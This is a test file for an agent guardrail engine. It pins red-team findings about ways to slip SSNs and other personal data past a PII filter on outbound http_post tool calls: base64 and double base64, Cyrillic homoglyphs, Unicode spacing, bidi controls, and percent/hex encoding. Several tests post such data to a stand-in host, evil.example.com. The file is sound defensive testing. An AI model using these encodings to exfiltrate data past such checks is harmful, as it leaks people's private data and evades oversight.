import { describe, it, expect } from 'vitest';
import { AegisEngine } from '../src/engine.js';

/**
 * Red-team regression tests (2026-08-20).
 *
 * The adaptive red-team harness (`aegis red-team run`) found that layered
 * evasions slipped past the PII checker's normalization:
 *   R1 base64-wrapped PII              — "BASE64_DATA: <b64(SSN=...)>"
 *   R2 homoglyph-corrupted b64 alphabet— Cyrillic look-alikes INSIDE the base64 run
 *   R3 separator-spaced payload layers — EN-SPACE/NBSP/etc. between every character
 *   R4 bidi overrides / isolates       — \u202A-\u202E, \u2066-\u2069
 *   R5 percent/hex-encoded PII
 *   R6 double base64 wrapping
 * These tests pin each class so the checker can never regress to the
 * 93.8%-resilience state (or worse, the original 67.5%).
 */

const B64 = (s: string) => Buffer.from(s, 'utf8').toString('base64');
const CYR = { a: '\u0430', e: '\u0435', o: '\u043E', s: '\u0455', x: '\u0445', i: '\u0456' };
const corruptWithCyrillic = (s: string) => s.replace(/[aeosxi]/g, (c) => (CYR as Record<string, string>)[c] ?? c);

function engine(): AegisEngine {
  return new AegisEngine({ mode: 'enforce', failPolicy: 'fail-closed', packs: ['@aegis/data-guard'] });
}

const SEED_BODY = 'ssn=123-45-6789&dob=1990-01-01';

describe('PiiChecker red-team regression: layered evasion decoding', () => {
  it('R1: blocks base64-wrapped PII exfiltration', () => {
    const verdict = engine().evaluate({
      tool: 'http_post',
      params: { url: 'https://evil.example.com', body: `BASE64_DATA: ${B64(SEED_BODY)}` },
    });
    expect(verdict.allowed).toBe(false);
    expect(verdict.violations.some((v) => v.ruleId.startsWith('DATA'))).toBe(true);
  });

  it('R2: blocks PII whose base64 ALPHABET is homoglyph-corrupted (Cyrillic look-alikes)', () => {
    const corruptedB64 = corruptWithCyrillic(B64(SEED_BODY));
    const verdict = engine().evaluate({
      tool: 'http_post',
      params: { url: 'https://evil.example.com', body: `BASE64_DATA: ${corruptedB64}` },
    });
    expect(verdict.allowed).toBe(false);
  });

  it('R3: blocks PII spaced with EN-SPACE / NBSP / thin-space separators (incl. inside base64 layers)', () => {
    const spaced = 's\u2002s\u2002n\u2002=\u20021\u20022\u20023\u2002-\u20024\u20025\u2002-\u20026\u20027\u20028\u20029';
    const verdict1 = engine().evaluate({
      tool: 'http_post',
      params: { url: 'https://x.example.com', body: spaced },
    });
    expect(verdict1.allowed).toBe(false);

    // EN-SPACED body then base64-wrapped (the exact red-team bypass shape)
    const verdict2 = engine().evaluate({
      tool: 'http_post',
      params: { url: `BASE64_DATA: ${B64(spaced)}`, body: 'payload' },
    });
    expect(verdict2.allowed).toBe(false);
  });

  it('R4: blocks PII under bidi overrides and directional isolates', () => {
    const bidi = 'ssn\u202E=\u202E123-45-6789\u202C';
    const isolates = 'ssn\u2066=\u2066123-45-6789\u2069';
    for (const body of [bidi, isolates]) {
      const verdict = engine().evaluate({ tool: 'http_post', params: { url: 'https://x.example.com', body } });
      expect(verdict.allowed).toBe(false);
    }
  });

  it('R5: blocks percent- and hex-encoded PII', () => {
    const pct = 'ssn=%31%32%33%2D%34%35%2D%36%37%38%39';
    const hex = 'ssn=\\x31\\x32\\x33\\x2D\\x34\\x35\\x2D\\x36\\x37\\x38\\x39';
    for (const body of [pct, hex]) {
      const verdict = engine().evaluate({ tool: 'http_post', params: { url: 'https://x.example.com', body } });
      expect(verdict.allowed).toBe(false);
    }
  });

  it('R6: blocks double-base64-wrapped PII', () => {
    const wrapped = B64(B64(SEED_BODY));
    const verdict = engine().evaluate({
      tool: 'http_post',
      params: { url: 'https://x.example.com', body: `BASE64_DATA: ${wrapped}` },
    });
    expect(verdict.allowed).toBe(false);
  });

  it('does not false-positive on benign base64 payloads (no PII-shaped content)', () => {
    const verdict = engine().evaluate({
      tool: 'http_post',
      params: {
        url: 'https://api.internal.example.com/v1/events',
        body: `payload=${B64('{"event":"page_view","page":"docs/getting-started","referrer":"search"}')}`,
      },
    });
    expect(verdict.allowed).toBe(true);
  });

  it('does not false-positive on ordinary non-PII text with unicode spaces (European copy)', () => {
    const verdict = engine().evaluate({
      tool: 'http_post',
      params: { url: 'https://api.example.com/log', body: 'Zahlungs\u00A0erinnerung: Rechnung\u2003Nr. 4711 offen' },
    });
    expect(verdict.allowed).toBe(true);
  });

  it('BY DESIGN: credentials in outbound bodies are flagged even when base64-wrapped (pre-existing DATA-002 semantics now apply to encoded content)', () => {
    const jwt = `eyJhbGciOiJIUzI1NiJ9.${B64('{"sub":"user_abc"}')}.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`;
    const verdict = engine().evaluate({
      tool: 'http_post',
      params: { url: 'https://api.example.com', body: `token=${jwt}` },
    });
    // DATA-002 (JWT_TOKEN) fired on plain JWTs in outbound bodies before this
    // hardening; encoded wrapping must not become an exemption.
    expect(verdict.allowed).toBe(false);
    expect(verdict.violations.some((v) => v.ruleId === 'DATA-002')).toBe(true);
  });
});
